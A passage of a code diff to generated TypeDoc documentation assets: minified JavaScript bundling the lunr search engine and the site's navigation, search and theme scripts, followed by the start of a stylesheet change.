t.Pipeline,this.documentCount=0,this._b=.75,this._k1=1.2,this.termIndex=0,this.metadataWhitelist=[]},t.Builder.prototype.ref=function(e){this._ref=e},t.Builder.prototype.field=function(e,n){if(/\\//.test(e))throw new RangeError(\"Field '\"+e+\"' contains illegal character '/'\");this._fields[e]=n||{}},t.Builder.prototype.b=function(e){e<0?this._b=0:e>1?this._b=1:this._b=e},t.Builder.prototype.k1=function(e){this._k1=e},t.Builder.prototype.add=function(e,n){var r=e[this._ref],i=Object.keys(this._fields);this._documents[r]=n||{},this.documentCount+=1;for(var s=0;s<i.length;s++){var o=i[s],a=this._fields[o].extractor,l=a?a(e):e[o],u=this.tokenizer(l,{fields:[o]}),d=this.pipeline.run(u),m=new t.FieldRef(r,o),p=Object.create(null);this.fieldTermFrequencies[m]=p,this.fieldLengths[m]=0,this.fieldLengths[m]+=d.length;for(var b=0;b<d.length;b++){var g=d[b];if(p[g]==null&&(p[g]=0),p[g]+=1,this.invertedIndex[g]==null){var L=Object.create(null);L._index=this.termIndex,this.termIndex+=1;for(var f=0;f<i.length;f++)L[i[f]]=Object.create(null);this.invertedIndex[g]=L}this.invertedIndex[g][o][r]==null&&(this.invertedIndex[g][o][r]=Object.create(null));for(var y=0;y<this.metadataWhitelist.length;y++){var S=this.metadataWhitelist[y],w=g.metadata[S];this.invertedIndex[g][o][r][S]==null&&(this.invertedIndex[g][o][r][S]=[]),this.invertedIndex[g][o][r][S].push(w)}}}},t.Builder.prototype.calculateAverageFieldLengths=function(){for(var e=Object.keys(this.fieldLengths),n=e.length,r={},i={},s=0;s<n;s++){var o=t.FieldRef.fromString(e[s]),a=o.fieldName;i[a]||(i[a]=0),i[a]+=1,r[a]||(r[a]=0),r[a]+=this.fieldLengths[o]}for(var l=Object.keys(this._fields),s=0;s<l.length;s++){var u=l[s];r[u]=r[u]/i[u]}this.averageFieldLength=r},t.Builder.prototype.createFieldVectors=function(){for(var e={},n=Object.keys(this.fieldTermFrequencies),r=n.length,i=Object.create(null),s=0;s<r;s++){for(var o=t.FieldRef.fromString(n[s]),a=o.fieldName,l=this.fieldLengths[o],u=new t.Vector,d=this.fieldTermFrequencies[o],m=Object.keys(d),p=m.length,b=this._fields[a].boost||1,g=this._documents[o.docRef].boost||1,L=0;L<p;L++){var f=m[L],y=d[f],S=this.invertedIndex[f]._index,w,k,_;i[f]===void 0?(w=t.idf(this.invertedIndex[f],this.documentCount),i[f]=w):w=i[f],k=w*((this._k1+1)*y)/(this._k1*(1-this._b+this._b*(l/this.averageFieldLength[a]))+y),k*=b,k*=g,_=Math.round(k*1e3)/1e3,u.insert(S,_)}e[o]=u}this.fieldVectors=e},t.Builder.prototype.createTokenSet=function(){this.tokenSet=t.TokenSet.fromArray(Object.keys(this.invertedIndex).sort())},t.Builder.prototype.build=function(){return this.calculateAverageFieldLengths(),this.createFieldVectors(),this.createTokenSet(),new t.Index({invertedIndex:this.invertedIndex,fieldVectors:this.fieldVectors,tokenSet:this.tokenSet,fields:Object.keys(this._fields),pipeline:this.searchPipeline})},t.Builder.prototype.use=function(e){var n=Array.prototype.slice.call(arguments,1);n.unshift(this),e.apply(this,n)},t.MatchData=function(e,n,r){for(var i=Object.create(null),s=Object.keys(r||{}),o=0;o<s.length;o++){var a=s[o];i[a]=r[a].slice()}this.metadata=Object.create(null),e!==void 0&&(this.metadata[e]=Object.create(null),this.metadata[e][n]=i)},t.MatchData.prototype.combine=function(e){for(var n=Object.keys(e.metadata),r=0;r<n.length;r++){var i=n[r],s=Object.keys(e.metadata[i]);this.metadata[i]==null&&(this.metadata[i]=Object.create(null));for(var o=0;o<s.length;o++){var a=s[o],l=Object.keys(e.metadata[i][a]);this.metadata[i][a]==null&&(this.metadata[i][a]=Object.create(null));for(var u=0;u<l.length;u++){var d=l[u];this.metadata[i][a][d]==null?this.metadata[i][a][d]=e.metadata[i][a][d]:this.metadata[i][a][d]=this.metadata[i][a][d].concat(e.metadata[i][a][d])}}}},t.MatchData.prototype.add=function(e,n,r){if(!(e in this.metadata)){this.metadata[e]=Object.create(null),this.metadata[e][n]=r;return}if(!(n in this.metadata[e])){this.metadata[e][n]=r;return}for(var i=Object.keys(r),s=0;s<i.length;s++){var o=i[s];o in this.metadata[e][n]?this.metadata[e][n][o]=this.metadata[e][n][o].concat(r[o]):this.metadata[e][n][o]=r[o]}},t.Query=function(e){this.clauses=[],this.allFields=e},t.Query.wildcard=new String(\"*\"),t.Query.wildcard.NONE=0,t.Query.wildcard.LEADING=1,t.Query.wildcard.TRAILING=2,t.Query.presence={OPTIONAL:1,REQUIRED:2,PROHIBITED:3},t.Query.prototype.clause=function(e){return\"fields\"in e||(e.fields=this.allFields),\"boost\"in e||(e.boost=1),\"usePipeline\"in e||(e.usePipeline=!0),\"wildcard\"in e||(e.wildcard=t.Query.wildcard.NONE),e.wildcard&t.Query.wildcard.LEADING&&e.term.charAt(0)!=t.Query.wildcard&&(e.term=\"*\"+e.term),e.wildcard&t.Query.wildcard.TRAILING&&e.term.slice(-1)!=t.Query.wildcard&&(e.term=\"\"+e.term+\"*\"),\"presence\"in e||(e.presence=t.Query.presence.OPTIONAL),this.clauses.push(e),this},t.Query.prototype.isNegated=function(){for(var e=0;e<this.clauses.length;e++)if(this.clauses[e].presence!=t.Query.presence.PROHIBITED)return!1;return!0},t.Query.prototype.term=function(e,n){if(Array.isArray(e))return e.forEach(function(i){this.term(i,t.utils.clone(n))},this),this;var r=n||{};return r.term=e.toString(),this.clause(r),this},t.QueryParseError=function(e,n,r){this.name=\"QueryParseError\",this.message=e,this.start=n,this.end=r},t.QueryParseError.prototype=new Error,t.QueryLexer=function(e){this.lexemes=[],this.str=e,this.length=e.length,this.pos=0,this.start=0,this.escapeCharPositions=[]},t.QueryLexer.prototype.run=function(){for(var e=t.QueryLexer.lexText;e;)e=e(this)},t.QueryLexer.prototype.sliceString=function(){for(var e=[],n=this.start,r=this.pos,i=0;i<this.escapeCharPositions.length;i++)r=this.escapeCharPositions[i],e.push(this.str.slice(n,r)),n=r+1;return e.push(this.str.slice(n,this.pos)),this.escapeCharPositions.length=0,e.join(\"\")},t.QueryLexer.prototype.emit=function(e){this.lexemes.push({type:e,str:this.sliceString(),start:this.start,end:this.pos}),this.start=this.pos},t.QueryLexer.prototype.escapeCharacter=function(){this.escapeCharPositions.push(this.pos-1),this.pos+=1},t.QueryLexer.prototype.next=function(){if(this.pos>=this.length)return t.QueryLexer.EOS;var e=this.str.charAt(this.pos);return this.pos+=1,e},t.QueryLexer.prototype.width=function(){return this.pos-this.start},t.QueryLexer.prototype.ignore=function(){this.start==this.pos&&(this.pos+=1),this.start=this.pos},t.QueryLexer.prototype.backup=function(){this.pos-=1},t.QueryLexer.prototype.acceptDigitRun=function(){var e,n;do e=this.next(),n=e.charCodeAt(0);while(n>47&&n<58);e!=t.QueryLexer.EOS&&this.backup()},t.QueryLexer.prototype.more=function(){return this.pos<this.length},t.QueryLexer.EOS=\"EOS\",t.QueryLexer.FIELD=\"FIELD\",t.QueryLexer.TERM=\"TERM\",t.QueryLexer.EDIT_DISTANCE=\"EDIT_DISTANCE\",t.QueryLexer.BOOST=\"BOOST\",t.QueryLexer.PRESENCE=\"PRESENCE\",t.QueryLexer.lexField=function(e){return e.backup(),e.emit(t.QueryLexer.FIELD),e.ignore(),t.QueryLexer.lexText},t.QueryLexer.lexTerm=function(e){if(e.width()>1&&(e.backup(),e.emit(t.QueryLexer.TERM)),e.ignore(),e.more())return t.QueryLexer.lexText},t.QueryLexer.lexEditDistance=function(e){return e.ignore(),e.acceptDigitRun(),e.emit(t.QueryLexer.EDIT_DISTANCE),t.QueryLexer.lexText},t.QueryLexer.lexBoost=function(e){return e.ignore(),e.acceptDigitRun(),e.emit(t.QueryLexer.BOOST),t.QueryLexer.lexText},t.QueryLexer.lexEOS=function(e){e.width()>0&&e.emit(t.QueryLexer.TERM)},t.QueryLexer.termSeparator=t.tokenizer.separator,t.QueryLexer.lexText=function(e){for(;;){var n=e.next();if(n==t.QueryLexer.EOS)return t.QueryLexer.lexEOS;if(n.charCodeAt(0)==92){e.escapeCharacter();continue}if(n==\":\")return t.QueryLexer.lexField;if(n==\"~\")return e.backup(),e.width()>0&&e.emit(t.QueryLexer.TERM),t.QueryLexer.lexEditDistance;if(n==\"^\")return e.backup(),e.width()>0&&e.emit(t.QueryLexer.TERM),t.QueryLexer.lexBoost;if(n==\"+\"&&e.width()===1||n==\"-\"&&e.width()===1)return e.emit(t.QueryLexer.PRESENCE),t.QueryLexer.lexText;if(n.match(t.QueryLexer.termSeparator))return t.QueryLexer.lexTerm}},t.QueryParser=function(e,n){this.lexer=new t.QueryLexer(e),this.query=n,this.currentClause={},this.lexemeIdx=0},t.QueryParser.prototype.parse=function(){this.lexer.run(),this.lexemes=this.lexer.lexemes;for(var e=t.QueryParser.parseClause;e;)e=e(this);return this.query},t.QueryParser.prototype.peekLexeme=function(){return this.lexemes[this.lexemeIdx]},t.QueryParser.prototype.consumeLexeme=function(){var e=this.peekLexeme();return this.lexemeIdx+=1,e},t.QueryParser.prototype.nextClause=function(){var e=this.currentClause;this.query.clause(e),this.currentClause={}},t.QueryParser.parseClause=function(e){var n=e.peekLexeme();if(n!=null)switch(n.type){case t.QueryLexer.PRESENCE:return t.QueryParser.parsePresence;case t.QueryLexer.FIELD:return t.QueryParser.parseField;case t.QueryLexer.TERM:return t.QueryParser.parseTerm;default:var r=\"expected either a field or a term, found \"+n.type;throw n.str.length>=1&&(r+=\" with value '\"+n.str+\"'\"),new t.QueryParseError(r,n.start,n.end)}},t.QueryParser.parsePresence=function(e){var n=e.consumeLexeme();if(n!=null){switch(n.str){case\"-\":e.currentClause.presence=t.Query.presence.PROHIBITED;break;case\"+\":e.currentClause.presence=t.Query.presence.REQUIRED;break;default:var r=\"unrecognised presence operator'\"+n.str+\"'\";throw new t.QueryParseError(r,n.start,n.end)}var i=e.peekLexeme();if(i==null){var r=\"expecting term or field, found nothing\";throw new t.QueryParseError(r,n.start,n.end)}switch(i.type){case t.QueryLexer.FIELD:return t.QueryParser.parseField;case t.QueryLexer.TERM:return t.QueryParser.parseTerm;default:var r=\"expecting term or field, found '\"+i.type+\"'\";throw new t.QueryParseError(r,i.start,i.end)}}},t.QueryParser.parseField=function(e){var n=e.consumeLexeme();if(n!=null){if(e.query.allFields.indexOf(n.str)==-1){var r=e.query.allFields.map(function(o){return\"'\"+o+\"'\"}).join(\", \"),i=\"unrecognised field '\"+n.str+\"', possible fields: \"+r;throw new t.QueryParseError(i,n.start,n.end)}e.currentClause.fields=[n.str];var s=e.peekLexeme();if(s==null){var i=\"expecting term, found nothing\";throw new t.QueryParseError(i,n.start,n.end)}switch(s.type){case t.QueryLexer.TERM:return t.QueryParser.parseTerm;default:var i=\"expecting term, found '\"+s.type+\"'\";throw new t.QueryParseError(i,s.start,s.end)}}},t.QueryParser.parseTerm=function(e){var n=e.consumeLexeme();if(n!=null){e.currentClause.term=n.str.toLowerCase(),n.str.indexOf(\"*\")!=-1&&(e.currentClause.usePipeline=!1);var r=e.peekLexeme();if(r==null){e.nextClause();return}switch(r.type){case t.QueryLexer.TERM:return e.nextClause(),t.QueryParser.parseTerm;case t.QueryLexer.FIELD:return e.nextClause(),t.QueryParser.parseField;case t.QueryLexer.EDIT_DISTANCE:return t.QueryParser.parseEditDistance;case t.QueryLexer.BOOST:return t.QueryParser.parseBoost;case t.QueryLexer.PRESENCE:return e.nextClause(),t.QueryParser.parsePresence;default:var i=\"Unexpected lexeme type '\"+r.type+\"'\";throw new t.QueryParseError(i,r.start,r.end)}}},t.QueryParser.parseEditDistance=function(e){var n=e.consumeLexeme();if(n!=null){var r=parseInt(n.str,10);if(isNaN(r)){var i=\"edit distance must be numeric\";throw new t.QueryParseError(i,n.start,n.end)}e.currentClause.editDistance=r;var s=e.peekLexeme();if(s==null){e.nextClause();return}switch(s.type){case t.QueryLexer.TERM:return e.nextClause(),t.QueryParser.parseTerm;case t.QueryLexer.FIELD:return e.nextClause(),t.QueryParser.parseField;case t.QueryLexer.EDIT_DISTANCE:return t.QueryParser.parseEditDistance;case t.QueryLexer.BOOST:return t.QueryParser.parseBoost;case t.QueryLexer.PRESENCE:return e.nextClause(),t.QueryParser.parsePresence;default:var i=\"Unexpected lexeme type '\"+s.type+\"'\";throw new t.QueryParseError(i,s.start,s.end)}}},t.QueryParser.parseBoost=function(e){var n=e.consumeLexeme();if(n!=null){var r=parseInt(n.str,10);if(isNaN(r)){var i=\"boost must be numeric\";throw new t.QueryParseError(i,n.start,n.end)}e.currentClause.boost=r;var s=e.peekLexeme();if(s==null){e.nextClause();return}switch(s.type){case t.QueryLexer.TERM:return e.nextClause(),t.QueryParser.parseTerm;case t.QueryLexer.FIELD:return e.nextClause(),t.QueryParser.parseField;case t.QueryLexer.EDIT_DISTANCE:return t.QueryParser.parseEditDistance;case t.QueryLexer.BOOST:return t.QueryParser.parseBoost;case t.QueryLexer.PRESENCE:return e.nextClause(),t.QueryParser.parsePresence;default:var i=\"Unexpected lexeme type '\"+s.type+\"'\";throw new t.QueryParseError(i,s.start,s.end)}}},function(e,n){typeof define==\"function\"&&define.amd?define(n):typeof ae==\"object\"?le.exports=n():e.lunr=n()}(this,function(){return t})})()});var se=[];function G(t,e){se.push({selector:e,constructor:t})}var U=class{constructor(){this.alwaysVisibleMember=null;this.createComponents(document.body),this.ensureFocusedElementVisible(),this.listenForCodeCopies(),window.addEventListener(\"hashchange\",()=>this.ensureFocusedElementVisible()),document.body.style.display||(this.ensureFocusedElementVisible(),this.updateIndexVisibility(),this.scrollToHash())}createComponents(e){se.forEach(n=>{e.querySelectorAll(n.selector).forEach(r=>{r.dataset.hasInstance||(new n.constructor({el:r,app:this}),r.dataset.hasInstance=String(!0))})})}filterChanged(){this.ensureFocusedElementVisible()}showPage(){document.body.style.display&&(document.body.style.removeProperty(\"display\"),this.ensureFocusedElementVisible(),this.updateIndexVisibility(),this.scrollToHash())}scrollToHash(){if(location.hash){let e=document.getElementById(location.hash.substring(1));if(!e)return;e.scrollIntoView({behavior:\"instant\",block:\"start\"})}}ensureActivePageVisible(){let e=document.querySelector(\".tsd-navigation .current\"),n=e?.parentElement;for(;n&&!n.classList.contains(\".tsd-navigation\");)n instanceof HTMLDetailsElement&&(n.open=!0),n=n.parentElement;if(e&&!Ve(e)){let r=e.getBoundingClientRect().top-document.documentElement.clientHeight/4;document.querySelector(\".site-menu\").scrollTop=r,document.querySelector(\".col-sidebar\").scrollTop=r}}updateIndexVisibility(){let e=document.querySelector(\".tsd-index-content\"),n=e?.open;e&&(e.open=!0),document.querySelectorAll(\".tsd-index-section\").forEach(r=>{r.style.display=\"block\";let i=Array.from(r.querySelectorAll(\".tsd-index-link\")).every(s=>s.offsetParent==null);r.style.display=i?\"none\":\"block\"}),e&&(e.open=n)}ensureFocusedElementVisible(){if(this.alwaysVisibleMember&&(this.alwaysVisibleMember.classList.remove(\"always-visible\"),this.alwaysVisibleMember.firstElementChild.remove(),this.alwaysVisibleMember=null),!location.hash)return;let e=document.getElementById(location.hash.substring(1));if(!e)return;let n=e.parentElement;for(;n&&n.tagName!==\"SECTION\";)n=n.parentElement;if(!n)return;let r=n.offsetParent==null,i=n;for(;i!==document.body;)i instanceof HTMLDetailsElement&&(i.open=!0),i=i.parentElement;if(n.offsetParent==null){this.alwaysVisibleMember=n,n.classList.add(\"always-visible\");let s=document.createElement(\"p\");s.classList.add(\"warning\"),s.textContent=window.translations.normally_hidden,n.prepend(s)}r&&e.scrollIntoView()}listenForCodeCopies(){document.querySelectorAll(\"pre > button\").forEach(e=>{let n;e.addEventListener(\"click\",()=>{e.previousElementSibling instanceof HTMLElement&&navigator.clipboard.writeText(e.previousElementSibling.innerText.trim()),e.textContent=window.translations.copied,e.classList.add(\"visible\"),clearTimeout(n),n=setTimeout(()=>{e.classList.remove(\"visible\"),n=setTimeout(()=>{e.textContent=window.translations.copy},100)},1e3)})})}};function Ve(t){let e=t.getBoundingClientRect(),n=Math.max(document.documentElement.clientHeight,window.innerHeight);return!(e.bottom<0||e.top-n>=0)}var oe=(t,e=100)=>{let n;return()=>{clearTimeout(n),n=setTimeout(()=>t(),e)}};var pe=Ae(ue());async function ce(t,e){if(!window.searchData)return;let n=await fetch(window.searchData),r=new Blob([await n.arrayBuffer()]).stream().pipeThrough(new DecompressionStream(\"gzip\")),i=await new Response(r).json();t.data=i,t.index=pe.Index.load(i.index),e.classList.remove(\"loading\"),e.classList.add(\"ready\")}function fe(){let t=document.getElementById(\"tsd-search\");if(!t)return;let e={base:t.dataset.base+\"/\"},n=document.getElementById(\"tsd-search-script\");t.classList.add(\"loading\"),n&&(n.addEventListener(\"error\",()=>{t.classList.remove(\"loading\"),t.classList.add(\"failure\")}),n.addEventListener(\"load\",()=>{ce(e,t)}),ce(e,t));let r=document.querySelector(\"#tsd-search input\"),i=document.querySelector(\"#tsd-search .results\");if(!r||!i)throw new Error(\"The input field or the result list wrapper was not found\");i.addEventListener(\"mouseup\",()=>{te(t)}),r.addEventListener(\"focus\",()=>t.classList.add(\"has-focus\")),He(t,i,r,e)}function He(t,e,n,r){n.addEventListener(\"input\",oe(()=>{Ne(t,e,n,r)},200)),n.addEventListener(\"keydown\",i=>{i.key==\"Enter\"?Be(e,t):i.key==\"ArrowUp\"?(de(e,n,-1),i.preventDefault()):i.key===\"ArrowDown\"&&(de(e,n,1),i.preventDefault())}),document.body.addEventListener(\"keypress\",i=>{i.altKey||i.ctrlKey||i.metaKey||!n.matches(\":focus\")&&i.key===\"/\"&&(i.preventDefault(),n.focus())}),document.body.addEventListener(\"keyup\",i=>{t.classList.contains(\"has-focus\")&&(i.key===\"Escape\"||!e.matches(\":focus-within\")&&!n.matches(\":focus\"))&&(n.blur(),te(t))})}function te(t){t.classList.remove(\"has-focus\")}function Ne(t,e,n,r){if(!r.index||!r.data)return;e.textContent=\"\";let i=n.value.trim(),s;if(i){let o=i.split(\" \").map(a=>a.length?`*${a}*`:\"\").join(\" \");s=r.index.search(o)}else s=[];for(let o=0;o<s.length;o++){let a=s[o],l=r.data.rows[Number(a.ref)],u=1;l.name.toLowerCase().startsWith(i.toLowerCase())&&(u*=1+1/(1+Math.abs(l.name.length-i.length))),a.score*=u}if(s.length===0){let o=document.createElement(\"li\");o.classList.add(\"no-results\");let a=document.createElement(\"span\");a.textContent=\"No results found\",o.appendChild(a),e.appendChild(o)}s.sort((o,a)=>a.score-o.score);for(let o=0,a=Math.min(10,s.length);o<a;o++){let l=r.data.rows[Number(s[o].ref)],u=`<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" class=\"tsd-kind-icon\"><use href=\"#icon-${l.kind}\"></use></svg>`,d=he(l.name,i);globalThis.DEBUG_SEARCH_WEIGHTS&&(d+=` (score: ${s[o].score.toFixed(2)})`),l.parent&&(d=`<span class=\"parent\">\n                 ${he(l.parent,i)}.</span>${d}`);let m=document.createElement(\"li\");m.classList.value=l.classes??\"\";let p=document.createElement(\"a\");p.href=r.base+l.url,p.innerHTML=u+d,m.append(p),p.addEventListener(\"focus\",()=>{e.querySelector(\".current\")?.classList.remove(\"current\"),m.classList.add(\"current\")}),e.appendChild(m)}}function de(t,e,n){let r=t.querySelector(\".current\");if(!r)r=t.querySelector(n==1?\"li:first-child\":\"li:last-child\"),r&&r.classList.add(\"current\");else{let i=r;if(n===1)do i=i.nextElementSibling??void 0;while(i instanceof HTMLElement&&i.offsetParent==null);else do i=i.previousElementSibling??void 0;while(i instanceof HTMLElement&&i.offsetParent==null);i?(r.classList.remove(\"current\"),i.classList.add(\"current\")):n===-1&&(r.classList.remove(\"current\"),e.focus())}}function Be(t,e){let n=t.querySelector(\".current\");if(n||(n=t.querySelector(\"li:first-child\")),n){let r=n.querySelector(\"a\");r&&(window.location.href=r.href),te(e)}}function he(t,e){if(e===\"\")return t;let n=t.toLocaleLowerCase(),r=e.toLocaleLowerCase(),i=[],s=0,o=n.indexOf(r);for(;o!=-1;)i.push(ee(t.substring(s,o)),`<b>${ee(t.substring(o,o+r.length))}</b>`),s=o+r.length,o=n.indexOf(r,s);return i.push(ee(t.substring(s))),i.join(\"\")}var je={\"&\":\"&amp;\",\"<\":\"&lt;\",\">\":\"&gt;\",\"'\":\"&#039;\",'\"':\"&quot;\"};function ee(t){return t.replace(/[&<>\"'\"]/g,e=>je[e])}var I=class{constructor(e){this.el=e.el,this.app=e.app}};var F=\"mousedown\",ye=\"mousemove\",N=\"mouseup\",J={x:0,y:0},me=!1,ne=!1,qe=!1,D=!1,ve=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);document.documentElement.classList.add(ve?\"is-mobile\":\"not-mobile\");ve&&\"ontouchstart\"in document.documentElement&&(qe=!0,F=\"touchstart\",ye=\"touchmove\",N=\"touchend\");document.addEventListener(F,t=>{ne=!0,D=!1;let e=F==\"touchstart\"?t.targetTouches[0]:t;J.y=e.pageY||0,J.x=e.pageX||0});document.addEventListener(ye,t=>{if(ne&&!D){let e=F==\"touchstart\"?t.targetTouches[0]:t,n=J.x-(e.pageX||0),r=J.y-(e.pageY||0);D=Math.sqrt(n*n+r*r)>10}});document.addEventListener(N,()=>{ne=!1});document.addEventListener(\"click\",t=>{me&&(t.preventDefault(),t.stopImmediatePropagation(),me=!1)});var X=class extends I{constructor(e){super(e),this.className=this.el.dataset.toggle||\"\",this.el.addEventListener(N,n=>this.onPointerUp(n)),this.el.addEventListener(\"click\",n=>n.preventDefault()),document.addEventListener(F,n=>this.onDocumentPointerDown(n)),document.addEventListener(N,n=>this.onDocumentPointerUp(n))}setActive(e){if(this.active==e)return;this.active=e,document.documentElement.classList.toggle(\"has-\"+this.className,e),this.el.classList.toggle(\"active\",e);let n=(this.active?\"to-has-\":\"from-has-\")+this.className;document.documentElement.classList.add(n),setTimeout(()=>document.documentElement.classList.remove(n),500)}onPointerUp(e){D||(this.setActive(!0),e.preventDefault())}onDocumentPointerDown(e){if(this.active){if(e.target.closest(\".col-sidebar, .tsd-filter-group\"))return;this.setActive(!1)}}onDocumentPointerUp(e){if(!D&&this.active&&e.target.closest(\".col-sidebar\")){let n=e.target.closest(\"a\");if(n){let r=window.location.href;r.indexOf(\"#\")!=-1&&(r=r.substring(0,r.indexOf(\"#\"))),n.href.substring(0,r.length)==r&&setTimeout(()=>this.setActive(!1),250)}}}};var re;try{re=localStorage}catch{re={getItem(){return null},setItem(){}}}var Q=re;var ge=document.head.appendChild(document.createElement(\"style\"));ge.dataset.for=\"filters\";var Y=class extends I{constructor(e){super(e),this.key=`filter-${this.el.name}`,this.value=this.el.checked,this.el.addEventListener(\"change\",()=>{this.setLocalStorage(this.el.checked)}),this.setLocalStorage(this.fromLocalStorage()),ge.innerHTML+=`html:not(.${this.key}) .tsd-is-${this.el.name} { display: none; }\n-`,this.app.updateIndexVisibility()}fromLocalStorage(){let e=Q.getItem(this.key);return e?e===\"true\":this.el.checked}setLocalStorage(e){Q.setItem(this.key,e.toString()),this.value=e,this.handleValueChange()}handleValueChange(){this.el.checked=this.value,document.documentElement.classList.toggle(this.key,this.value),this.app.filterChanged(),this.app.updateIndexVisibility()}};var Z=class extends I{constructor(e){super(e),this.summary=this.el.querySelector(\".tsd-accordion-summary\"),this.icon=this.summary.querySelector(\"svg\"),this.key=`tsd-accordion-${this.summary.dataset.key??this.summary.textContent.trim().replace(/\\s+/g,\"-\").toLowerCase()}`;let n=Q.getItem(this.key);this.el.open=n?n===\"true\":this.el.open,this.el.addEventListener(\"toggle\",()=>this.update());let r=this.summary.querySelector(\"a\");r&&r.addEventListener(\"click\",()=>{location.assign(r.href)}),this.update()}update(){this.icon.style.transform=`rotate(${this.el.open?0:-90}deg)`,Q.setItem(this.key,this.el.open.toString())}};function Ee(t){let e=Q.getItem(\"tsd-theme\")||\"os\";t.value=e,xe(e),t.addEventListener(\"change\",()=>{Q.setItem(\"tsd-theme\",t.value),xe(t.value)})}function xe(t){document.documentElement.dataset.theme=t}var K;function we(){let t=document.getElementById(\"tsd-nav-script\");t&&(t.addEventListener(\"load\",Le),Le())}async function Le(){let t=document.getElementById(\"tsd-nav-container\");if(!t||!window.navigationData)return;let n=await(await fetch(window.navigationData)).arrayBuffer(),r=new Blob([n]).stream().pipeThrough(new DecompressionStream(\"gzip\")),i=await new Response(r).json();K=t.dataset.base,K.endsWith(\"/\")||(K+=\"/\"),t.innerHTML=\"\";for(let s of i)Se(s,t,[]);window.app.createComponents(t),window.app.showPage(),window.app.ensureActivePageVisible()}function Se(t,e,n){let r=e.appendChild(document.createElement(\"li\"));if(t.children){let i=[...n,t.text],s=r.appendChild(document.createElement(\"details\"));s.className=t.class?`${t.class} tsd-accordion`:\"tsd-accordion\";let o=s.appendChild(document.createElement(\"summary\"));o.className=\"tsd-accordion-summary\",o.dataset.key=i.join(\"$\"),o.innerHTML='<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"#icon-chevronDown\"></use></svg>',be(t,o);let a=s.appendChild(document.createElement(\"div\"));a.className=\"tsd-accordion-details\";let l=a.appendChild(document.createElement(\"ul\"));l.className=\"tsd-nested-navigation\";for(let u of t.children)Se(u,l,i)}else be(t,r,t.class)}function be(t,e,n){if(t.path){let r=e.appendChild(document.createElement(\"a\"));r.href=K+t.path,n&&(r.className=n),location.pathname===r.pathname&&!r.href.includes(\"#\")&&r.classList.add(\"current\"),t.kind&&(r.innerHTML=`<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" class=\"tsd-kind-icon\"><use href=\"#icon-${t.kind}\"></use></svg>`),r.appendChild(document.createElement(\"span\")).textContent=t.text}else e.appendChild(document.createElement(\"span\")).textContent=t.text}G(X,\"a[data-toggle]\");G(Z,\".tsd-accordion\");G(Y,\".tsd-filter-item input[type=checkbox]\");var Te=document.getElementById(\"tsd-theme\");Te&&Ee(Te);var $e=new U;Object.defineProperty(window,\"app\",{value:$e});fe();we();})();\n+`,this.app.updateIndexVisibility()}fromLocalStorage(){let e=Q.getItem(this.key);return e?e===\"true\":this.el.checked}setLocalStorage(e){Q.setItem(this.key,e.toString()),this.value=e,this.handleValueChange()}handleValueChange(){this.el.checked=this.value,document.documentElement.classList.toggle(this.key,this.value),this.app.filterChanged(),this.app.updateIndexVisibility()}};var Z=class extends I{constructor(e){super(e),this.summary=this.el.querySelector(\".tsd-accordion-summary\"),this.icon=this.summary.querySelector(\"svg\"),this.key=`tsd-accordion-${this.summary.dataset.key??this.summary.textContent.trim().replace(/\\s+/g,\"-\").toLowerCase()}`;let n=Q.getItem(this.key);this.el.open=n?n===\"true\":this.el.open,this.el.addEventListener(\"toggle\",()=>this.update());let r=this.summary.querySelector(\"a\");r&&r.addEventListener(\"click\",()=>{location.assign(r.href)}),this.update()}update(){this.icon.style.transform=`rotate(${this.el.open?0:-90}deg)`,Q.setItem(this.key,this.el.open.toString())}};function Ee(t){let e=Q.getItem(\"tsd-theme\")||\"os\";t.value=e,xe(e),t.addEventListener(\"change\",()=>{Q.setItem(\"tsd-theme\",t.value),xe(t.value)})}function xe(t){document.documentElement.dataset.theme=t}var K;function we(){let t=document.getElementById(\"tsd-nav-script\");t&&(t.addEventListener(\"load\",Le),Le())}async function Le(){let t=document.getElementById(\"tsd-nav-container\");if(!t||!window.navigationData)return;let n=await(await fetch(window.navigationData)).arrayBuffer(),r=new Blob([n]).stream().pipeThrough(new DecompressionStream(\"gzip\")),i=await new Response(r).json();K=t.dataset.base,K.endsWith(\"/\")||(K+=\"/\"),t.innerHTML=\"\";for(let s of i)Se(s,t,[]);window.app.createComponents(t),window.app.showPage(),window.app.ensureActivePageVisible()}function Se(t,e,n){let r=e.appendChild(document.createElement(\"li\"));if(t.children){let i=[...n,t.text],s=r.appendChild(document.createElement(\"details\"));s.className=t.class?`${t.class} tsd-accordion`:\"tsd-accordion\";let o=s.appendChild(document.createElement(\"summary\"));o.className=\"tsd-accordion-summary\",o.dataset.key=i.join(\"$\"),o.innerHTML='<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"#icon-chevronDown\"></use></svg>',be(t,o);let a=s.appendChild(document.createElement(\"div\"));a.className=\"tsd-accordion-details\";let l=a.appendChild(document.createElement(\"ul\"));l.className=\"tsd-nested-navigation\";for(let u of t.children)Se(u,l,i)}else be(t,r,t.class)}function be(t,e,n){if(t.path){let r=e.appendChild(document.createElement(\"a\"));r.href=K+t.path,n&&(r.className=n),location.pathname===r.pathname&&!r.href.includes(\"#\")&&r.classList.add(\"current\"),t.kind&&(r.innerHTML=`<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" class=\"tsd-kind-icon\"><use href=\"#icon-${t.kind}\"></use></svg>`),r.appendChild(document.createElement(\"span\")).textContent=t.text}else{let r=e.appendChild(document.createElement(\"span\"));r.innerHTML='<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" class=\"tsd-kind-icon\"><use href=\"#icon-folder\"></use></svg>',r.appendChild(document.createElement(\"span\")).textContent=t.text}}G(X,\"a[data-toggle]\");G(Z,\".tsd-accordion\");G(Y,\".tsd-filter-item input[type=checkbox]\");var Te=document.getElementById(\"tsd-theme\");Te&&Ee(Te);var $e=new U;Object.defineProperty(window,\"app\",{value:$e});fe();we();})();\n /*! Bundled license information:\n \n lunr/lunr.js:\n```\n\nFilename: docs/ts/assets/style.css:\n```\n@@ -4,11 +4,17 @@\n--light-color-background-secondary: #eff0f1;\n     --light-color-warning-text: #222;\n     --light-color-background-warning: #e6e600;\n-    --light-color-icon-background: var(--light-color-background);\n     --light-color-accent: #c5c7c9;\n     